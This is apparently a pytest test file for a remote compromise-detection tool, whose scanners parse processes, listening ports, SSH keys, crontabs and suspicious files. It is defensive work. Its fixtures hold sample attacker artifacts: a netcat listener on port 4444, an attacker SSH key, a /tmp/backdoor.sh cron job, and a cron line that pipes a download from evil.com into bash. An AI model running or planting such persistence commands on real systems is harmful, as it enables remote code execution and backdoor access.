from unittest.mock import MagicMock

import pytest

from app.ssh.executor import CommandResult, RemoteExecutor
from app.scanners.processes import ProcessScanner
from app.scanners.network import NetworkScanner
from app.scanners.ssh_keys import SSHKeysScanner
from app.scanners.cron import CronScanner
from app.scanners.files import FilesScanner


def make_executor(outputs: dict[str, str]) -> RemoteExecutor:
    """Cria um executor mockado que retorna respostas predefinidas por comando."""
    executor = MagicMock(spec=RemoteExecutor)

    def run_safe(cmd):
        for key, output in outputs.items():
            if key in cmd:
                return CommandResult(command=cmd, stdout=output, stderr="", exit_code=0)
        return CommandResult(command=cmd, stdout="", stderr="", exit_code=0)

    executor.run_safe.side_effect = run_safe
    return executor


class TestProcessScanner:
    def test_parses_processes(self):
        ps_output = (
            "root         1  0.0  0.0  vsz vss tty s start  0:00 /sbin/init\n"
            "ubuntu    1234  0.1  0.5  vsz vss tty s start  0:00 /usr/bin/python3 app.py\n"
            "www-data  5678  0.0  0.1  vsz vss tty s start  0:00 /usr/sbin/nginx\n"
        )
        executor = make_executor({"ps aux": ps_output})
        result = ProcessScanner().run(executor)
        assert result.success
        assert len(result.parsed_data) == 3
        assert result.parsed_data[0]["user"] == "root"

    def test_handles_empty_output(self):
        executor = make_executor({})
        result = ProcessScanner().run(executor)
        assert result.success
        assert result.parsed_data == []


class TestNetworkScanner:
    def test_parses_ports(self):
        ss_output = (
            "Netid State  Recv-Q Send-Q Local Address:Port\n"
            "tcp   LISTEN 0      128    0.0.0.0:22    0.0.0.0:*   users:((\"sshd\",pid=123))\n"
            "tcp   LISTEN 0      50     0.0.0.0:4444  0.0.0.0:*   users:((\"nc\",pid=999))\n"
        )
        executor = make_executor({"ss": ss_output})
        result = NetworkScanner().run(executor)
        assert result.success
        assert isinstance(result.parsed_data, dict)
        assert "ports" in result.parsed_data

    def test_handles_error(self):
        executor = MagicMock(spec=RemoteExecutor)
        executor.run_safe.return_value = CommandResult(command="ss", stdout="", stderr="", exit_code=1)
        result = NetworkScanner().run(executor)
        assert result.success
        assert result.parsed_data == {"ports": [], "connections": []}


class TestSSHKeysScanner:
    def test_parses_authorized_keys(self):
        keys_output = (
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBhb attacker@evil\n"
            "# this is a comment\n"
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB user@host\n"
        )
        # O scanner verifica 2 caminhos (/root/... e /home/*/...), ambos casam no mock
        executor = make_executor({"authorized_keys": keys_output})
        result = SSHKeysScanner().run(executor)
        assert result.success
        # 2 chaves × 2 caminhos = 4 entradas
        assert len(result.parsed_data) == 4
        assert result.parsed_data[0]["key_type"] == "ssh-ed25519"

    def test_no_keys(self):
        executor = make_executor({})
        result = SSHKeysScanner().run(executor)
        assert result.success
        assert result.parsed_data == []


class TestCronScanner:
    def test_parses_cron_entries(self):
        cron_output = "*/5 * * * * /bin/bash /tmp/backdoor.sh\n# comment\n@reboot curl http://evil.com | bash\n"
        executor = make_executor({"crontab": cron_output})
        result = CronScanner().run(executor)
        assert result.success
        entries = [e["entry"] for e in result.parsed_data]
        assert any("/tmp/backdoor.sh" in e for e in entries)

    def test_ignores_comments(self):
        cron_output = "# only a comment\n"
        executor = make_executor({"crontab": cron_output})
        result = CronScanner().run(executor)
        assert result.parsed_data == []


class TestFilesScanner:
    def test_parses_suspicious_files(self):
        find_output = "/tmp/.x123\n/dev/shm/agent\n"
        executor = make_executor({"find": find_output})
        result = FilesScanner().run(executor)
        assert result.success
        assert isinstance(result.parsed_data, dict)
        assert "suspicious_files" in result.parsed_data
        assert "/tmp/.x123" in result.parsed_data["suspicious_files"]
